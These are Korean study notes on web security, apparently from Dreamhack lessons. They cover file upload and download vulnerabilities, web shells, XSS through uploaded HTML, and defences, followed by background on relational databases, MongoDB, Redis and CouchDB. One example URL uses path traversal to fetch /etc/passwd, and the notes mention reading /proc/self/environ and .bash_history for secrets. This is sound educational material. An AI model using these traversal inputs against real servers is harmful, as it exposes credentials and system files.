공격자의 파일을 웹 서비스의 파일 시스템에 업로드하는 과정에서 발생하는 보안 취약점  
이용자가 업로드될 파일의 이름을 임의로 정할 수 있을 때 발생  
ex) 파일 시스템 상 임의 경로에 원하는 파일을 업로드 or 악성 확장자를 갖는 파일을 업로드할 수 있을 때 발생  
원하는 시스템 커맨드를 실행하는 원격 코드 실행 취약점 유발 가능  

#### Path Traversal  
파일 업로드를 허용하는 대개의 서비스는 보안을 위해 특정 디렉토리에만 업로드를 허용  
만약 이러한 제한이 없다면, 악의적인 이용자가 웹 서버의 소스코드나 서버에 있는 중요 시스템 파일을 덮어 쓸 위험이 있음.  
* 업로드에 존재하는 이러한 제약을 우회하여, 임의 디렉토리에 파일을 업로드할 수 있는 취약점  

ex) 공격자가 ```../```와 같은 메타문자를 사용하면 지정된 디렉토리에서 벗어나 상위 디렉토리에도 파일을 업로드할 수 있음  
그래서 만약에 소스코드를 덮어쓴다면 서버가 재실행될 때 임의의 파이썬 코드를 실행할 수 있음  

#### 악성 파일 업로드  
이용자가 파일을 업로드할 때, 이를 제대로 검사하지 않아서 발생하는 취약점  

* **웹 쉘(Web Shell)**  
웹 서버는 .php, .jsp, .asp와 같은 확장자의 파일을 Common Gateway Interface(CGI)로 실행하고, 그 결과를 이용자에게 반환.   
```
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```  
위 코드는 이용자가 요청한 파일의 확장자가 정규표현식 ```".+\.ph(p[3457]?|t|tml)$"```를 만족하면, x-httpd-php로 핸들링하게 하는 Apache(정적인 데이터를 처리하는 웹서버) 설정 파일.  
x-httpd-php는 PHP 엔진이며 요청한 파일을 실행하고, 그 결과를 반환. .php, .php3, .phtml이 위의 정규표현식을 만족함.  

많은 웹 서버들이 php파일에 대해 위와 같은 핸들링을 지원.  
따라서 공격자가 임의의 php 소스 파일을 .php 확장자로 업로드하고, GET 요청을 보낼 수 있다면 CGI에 의해 해당 코드가 실행되도록 할 수 있다!!  

* **악의적인 웹 리소스**  
웹 브라우저는 파일의 확장자나 응답의 Content-Type에 따라 요청을 다양하게 처리.  
파일의 확장자가 .html 이거나, 반환된 Content-Type 헤더가 text/html일 경우 응답은 HTML 엔진으로 처리.  
파일의 확장자가 .png, .jpg등의 이미지 확장자이거나, Content-Type이 image/png일 경우에는 이미지로 렌더링.  

> 만약 공격자가 서버에 exploit.html을 업로드하고, 이에 접근하는 URL이 https://dreamhack.io/uploads/exploit.html이라면, 브라우저는 이를 HTML로 해석.  
> exploit.html에 악의적인 스크립트를 삽입하면, Cross-Site-Scripting (XSS) 공격으로 이어질 수 있습니다.  



### File Download Vulnerability  
* 파일을 내려 받을 때 발생하는 취약점  
* Path Traversal 취약점과 함께 사용

웹 서비스의 파일 시스템에 존재하는 파일을 다운로드 하는 과정에서 발생하는 보안 취약점  
공격자는 웹 서비스의 파일 시스템에 존재하는 임의 파일을 다운로드 받을 수 있음  
이용자가 다운로드할 파일의 이름을 임의로 정할 수 있을 때 발생  
설정 파일, 패스워드 파일, 데이터 베이스 백업본 등을 다운로드 하여 민감한 정보 탈취, 2차 공격 수행 가능  

웹 서비스는 이용자가 업로드한 파일을 다운로드 받거나 이미지를 불러올 때 특정 디렉토리에 있는 파일만 접근하도록 해야 함.  
Path Traversal을 이용한 파일 다운로드 취약점은 파일 이름을 직접 입력받아 임의 디렉토리에 있는 파일을 다운로드 받을 수 있는 취약점  

* 파일 다운로드 취약점이 자주 발생하는 URL 패턴  
```
https://vulnerable-web.dreamhack.io/download/?filename=notes.txt
```
```
https://vulnerable-web.dreamhack.io/download/?filename=../../../../../../etc/passwd
```
```
https://vulnerable-web.dreamhack.io/images.php?fn=6ed0dd02806fa89e233b84f4.png
```

프로세스의 환경 변수는 ```/proc/[pid]/environ```, ```/proc/self/environ```에서 확인할 수 있음.  
만약 이용자가 프로세스를 호출하기 전에 환경 변수를 bash의 명령어로 설정했다면, ```.bash_history```에서도 이를 알 수 있음.  

### 방어법  
개발자는  

업로드 취약점 막으려면,  
* 업로드 디렉토리를 웹 서버에서 직접 접근할 수 없도록 함  
* 업로드 디렉토리에서는 CGI가 실행되지 않도록 함  
* 업로드된 파일 이름 그대로 사용하지 않기 -> basepath와 같은 함수를 통해 파일 이름을 검증한 후 사용  
* 허용할 확장자 명시하여 그 외 확장자는 업로드될 수 없도록

다운로드 취약점 막으려면,  
* 요청된 파일 이름을 basepath와 같은 함수를 통해 검증  
* 파일 이름과 1:1 맵핑되는 키를 만들어 이용자로부터 파일 이름이 아닌 키를 요청하도록  





---

## Background: DBMS  
### 관계형(Relational) DBMS  
> 행과 열의 집합인 테이블 형식으로 데이터 저장, 관리  
테이블 형식의 데이터를 조작할 수 있는 관계 연산자 SQL(Structured Query Language) 라는 쿼리 언어 제공.  
SQL은 RDBMS의 데이터를 정의하고 질의, 수정 등을 하기 위해 고안된 언어. 구조화된 형태를 가지는 언어.  
사용 목적과 행위에 따라 다양한 구조가 존재하며 대표적으로 아래와 같이 구분됨.  

|언어|설명|  
|:---:|:---:|  
|DDL (Data Definition Language)|데이터를 정의하기 위한 언어입니다. 데이터를 저장하기 위한 스키마, 데이터베이스의 생성/수정/삭제 등의 행위를 수행합니다.|  
|DML (Data Manipulation Language)|데이터를 조작하기 위한 언어입니다. 실제 데이터베이스 내에 존재하는 데이터에 대해 조회/저장/수정/삭제 등의 행위를 수행합니다.|  
|DCL (Data Control Language)|데이터베이스의 접근 권한 등의 설정을 하기 위한 언어입니다. 데이터베이스 내에 이용자의 권한을 부여하기 위한 GRANT와 권한을 박탈하는 REVOKE가 대표적입니다.|  

RDBMS에서 사용하는 기본적인 구조는 데이터베이스 -> 테이블 -> 데이터 구조  
데이터를 다루기 위해 데이터베이스와 테이블을 생성해야 하며, DDL을 사용해야함.(CREATE 명령)  
생성된 테이블에 데이터를 추가하기 위해 DML 사용.(INSERT, SELECT, UPDATE 명령)  

### 비관계형(Non-Relational) DBMS  
> Key-Value 형태로 값 저장  
ex) Redis, Dynamo, CouchDB, MongoDB  
NoSQL: Non SQL, Non relational SQL, Not only SQL(SQL을 사용하지 않고 데이터를 다룰 수 있다는 의미)  
SQL을 사용하지 않음으로써 RDBMS와는 달리 복잡하지 않은 데이터를 다루는 것이 큰 특징이자 RDBMS와의 차이  

#### MongoDB  
> Json 형태인 Document 저장  
1. 스키마를 따로 정의하지 않아 각 Collection에 대한 정의가 필요하지 않음(콜렉션: DB 하위에 속하는 개념으로 RDBMS의 테이블과 비슷)  
2. JSON 형식으로 쿼리 작성 가능  
3. _id 필드가 Primary Key 역할을 함  

* 데이터 삽입, 조회 쿼리  
```
$ mongo
> db.user.insert({uid: 'admin', upw: 'secretpassword'})
WriteResult({ "nInserted" : 1 })

> db.user.find({uid: 'admin'})
{ "_id" : ObjectId("5e71d395b050a2511caa827d"), "uid" : "admin", "upw" : "secretpassword" }
```  

|DBMS|QUERY|  
|:---:|:---:|  
|RDBMS|```SELECT * FROM inventory WHERE status = "A" and qty < 30;```|  
|MongoDB|```db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )```|  

* [MongoDB 연산자](https://blog.naver.com/shino1025/221294664013)  
* [MongoDB 연산자 공식문서](https://docs.mongodb.com/manual/reference/operator/query/)  
* [MongoDB 문법과 SQL 비교](https://learn.dreamhack.io/168#8)  

#### Redis  
> Key-Value 쌍을 가진 데이터 저장  
> 다른 DB와 다르게 메모리 기반의 DBMS; 메모리를 사용해 데이터를 저장하고, 접근하기 때문에 읽고 쓰는 작업이 다른 DBMS보다 훨씬 빠름.
> 이러한 특징으로 다양한 서비스에서 임시 데이터를 캐싱하는 용도로 주로 사용되고 있음.  

* redis 명령어 사용 예시  
[공식문서](https://redis.io/commands/)  
```
$ redis-cli
127.0.0.1:6379> SET test 1234 # SET key value
OK
127.0.0.1:6379> GET test # GET key
"1234"
```  

#### CouchDB  
> MongoDB와 같이 JSON 형태의 document 저장
> 웹 기반의 DBMS로 REST API 형식으로 요청 처리  

|메소드|기능설명|  
|:---:|:---:|  
|POST|새로운 레코드를 추가|  
|GET|레코드를 조회|  
|PUT|레코드를 업데이트|  
|DELETE|레코드를 삭제|  

* HTTP 요청으로 레코드를 업데이트하고 조회하는 예시  
```
$ curl -X PUT http://{username}:{password}@localhost:5984/users/guest -d '{"upw":"guest"}'
{"ok":true,"id":"guest","rev":"1-22a458e50cf189b17d50eeb295231896"}

$ curl http://{username}:{password}@localhost:5984/users/guest
{"_id":"guest","_rev":"1-22a458e50cf189b17d50eeb295231896","upw":"guest"}
```  
* ```_```문자로 시작하는 URL, 필드는 특수 구성 요소를 나타냄 [공식문서](https://docs.couchdb.org/en/latest/api/index.html)  

|요소|설명|  
|:---:|:---:|  
|\/|인스턴스에 대한 메타 정보 반환|  
|\/_all_dbs|인스턴스의 데이터베이스 목록 반환|  
|\/_utils|관리자페이지로 이동|  
|\/db|지정된 데이터베이스에 대한 정보 반환|  
|\/{db}/_all_docs|지정된 데이터베이스에 포함된 모든 도큐먼트 반환|  
|\/{db}/_find|지정된 데이터베이스에서 JSON 쿼리에 해당하는 모든 도큐먼트 반환|  



---
